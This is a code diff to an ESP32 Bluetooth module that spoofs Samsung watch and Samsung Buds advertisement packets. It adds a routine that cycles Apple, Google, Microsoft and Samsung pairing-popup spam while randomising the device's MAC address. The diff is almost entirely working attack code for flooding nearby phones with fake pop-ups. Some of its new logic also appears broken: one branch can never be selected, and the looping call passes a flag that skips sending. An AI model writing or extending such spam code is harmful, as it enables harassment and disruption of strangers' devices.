@@ -1,7 +1,6 @@
 #include "ble_module.h"
 #include <Arduino.h>
 
-
 const char* BLEModule::generateRandomName() {
   const char* charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
   int len = rand() % 10 + 1;
@@ -21,8 +20,9 @@ void BLEModule::generateRandomMac(uint8_t* mac) {
 }
 
 #ifdef HAS_BT
-NimBLEAdvertisementData BLEModule::GetUniversalAdvertisementData(EBLEPayloadType Type) {
+BLEData BLEModule::GetUniversalAdvertisementData(EBLEPayloadType Type) {
     NimBLEAdvertisementData AdvData = NimBLEAdvertisementData();
+    NimBLEAdvertisementData scannerData = NimBLEAdvertisementData();
 
     uint8_t* AdvData_Raw = nullptr;
     uint8_t i = 0;
@@ -73,27 +73,51 @@ NimBLEAdvertisementData BLEModule::GetUniversalAdvertisementData(EBLEPayloadType
       }
       case Samsung: {
 
-        AdvData_Raw = new uint8_t[15];
+        int randval = random(1, 2);
 
-        uint8_t model = watch_models[rand() % 25].value;
+        if (randval == 1)
+        {
+          AdvData_Raw = new uint8_t[15];
+
+          uint8_t model = watch_models[rand() % 25].value;
+          
+          AdvData_Raw[i++] = 14; // Size
+          AdvData_Raw[i++] = 0xFF; // AD Type (Manufacturer Specific)
+          AdvData_Raw[i++] = 0x75; // Company ID (Samsung Electronics Co. Ltd.)
+          AdvData_Raw[i++] = 0x00; // ...
+          AdvData_Raw[i++] = 0x01;
+          AdvData_Raw[i++] = 0x00;
+          AdvData_Raw[i++] = 0x02;
+          AdvData_Raw[i++] = 0x00;
+          AdvData_Raw[i++] = 0x01;
+          AdvData_Raw[i++] = 0x01;
+          AdvData_Raw[i++] = 0xFF;
+          AdvData_Raw[i++] = 0x00;
+          AdvData_Raw[i++] = 0x00;
+          AdvData_Raw[i++] = 0x43;
+          AdvData_Raw[i++] = (model >> 0x00) & 0xFF; // Watch Model / Color (?)
+
+          AdvData.addData(std::string((char *)AdvData_Raw, 15));
+        }
+        else 
+        {
+          uint8_t advertisementPacket[] = {
+            0x02, 0x01, 0x18, 0x1B, 0xFF, 0x75, 0x00, 0x42, 0x09, 0x81, 0x02, 0x14,
+            0x15, 0x03, 0x21, 0x01, 0x09, 0xEF, 0x0C, 0x01, 0x47, 0x06, 0x3C, 0x94, 0x8E,
+            0x00, 0x00, 0x00, 0x00, 0xC7, 0x00
+          };
+          uint8_t scanResponsePacket[] = {
+            0x10, 0xFF, 0x75, 0x00, 0x00, 0x63, 0x50, 0x8D, 0xB1, 0x17, 0x40, 0x46,
+            0x64, 0x64, 0x00, 0x01, 0x04
+          };
+
+          fill_samsungbud_byte(advertisementPacket);
+
+          AdvData.addData(std::string((char *)advertisementPacket, 31));
+          scannerData.addData(std::string((char *)scanResponsePacket, 17));
+        }
+
         
-        AdvData_Raw[i++] = 14; // Size
-        AdvData_Raw[i++] = 0xFF; // AD Type (Manufacturer Specific)
-        AdvData_Raw[i++] = 0x75; // Company ID (Samsung Electronics Co. Ltd.)
-        AdvData_Raw[i++] = 0x00; // ...
-        AdvData_Raw[i++] = 0x01;
-        AdvData_Raw[i++] = 0x00;
-        AdvData_Raw[i++] = 0x02;
-        AdvData_Raw[i++] = 0x00;
-        AdvData_Raw[i++] = 0x01;
-        AdvData_Raw[i++] = 0x01;
-        AdvData_Raw[i++] = 0xFF;
-        AdvData_Raw[i++] = 0x00;
-        AdvData_Raw[i++] = 0x00;
-        AdvData_Raw[i++] = 0x43;
-        AdvData_Raw[i++] = (model >> 0x00) & 0xFF; // Watch Model / Color (?)
-
-        AdvData.addData(std::string((char *)AdvData_Raw, 15));
 
         break;
       }
@@ -127,14 +151,31 @@ NimBLEAdvertisementData BLEModule::GetUniversalAdvertisementData(EBLEPayloadType
 
     delete[] AdvData_Raw;
 
-    return AdvData;
+    return {AdvData, scannerData};
 }
 #endif
 
-void BLEModule::executeSpam(EBLEPayloadType type) {
+void BLEModule::executeSpamAll()
+{
 #ifdef HAS_BT
     BLEInitilized = true;
     while (BLEInitilized)
+    {
+      executeSpam(EBLEPayloadType::Apple, false);
+      delay(100);
+      executeSpam(EBLEPayloadType::Google, false);
+      delay(100);
+      executeSpam(EBLEPayloadType::Microsoft, false);
+      delay(100);
+      executeSpam(EBLEPayloadType::Samsung, false);
+    }
+#endif
+}
+
+void BLEModule::executeSpam(EBLEPayloadType type, bool Loop) {
+#ifdef HAS_BT
+    BLEInitilized = Loop;
+    while (BLEInitilized && Loop)
     {
       NimBLEDevice::init("");
 
@@ -142,8 +183,9 @@ void BLEModule::executeSpam(EBLEPayloadType type) {
 
       pAdvertising = pServer->getAdvertising();
 
-      NimBLEAdvertisementData advertisementData = this->GetUniversalAdvertisementData(type);
-      pAdvertising->setAdvertisementData(advertisementData);
+      BLEData advertisementData = this->GetUniversalAdvertisementData(type);
+      pAdvertising->setAdvertisementData(advertisementData.AdvData);
+      pAdvertising->setScanResponseData(advertisementData.ScanData);
       pAdvertising->start();
       delay(100);
       pAdvertising->stop();
@@ -156,8 +198,6 @@ void BLEModule::executeSpam(EBLEPayloadType type) {
       esp_base_mac_addr_set(macAddr);
 
       delay(100);
-
-      Serial.println("Sent Packet");
     }
 #endif
 }
